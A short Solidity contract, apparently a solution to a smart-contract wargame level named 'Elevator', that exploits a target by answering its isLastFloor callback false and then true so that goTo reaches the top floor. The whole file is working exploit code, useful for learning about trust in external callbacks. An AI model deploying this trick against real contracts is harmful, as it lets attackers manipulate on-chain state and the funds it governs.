pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttacker {

    IElevator elevator;
    uint8 times_called = 0;

    constructor(address addr) {
        elevator = IElevator(addr);
    }

    function isLastFloor(uint) external returns (bool) {
        times_called ++;
        if (times_called == 1) {
            return false;
        }
        return true;
    }

    function attack() public {
        elevator.goTo(1);
    }

}
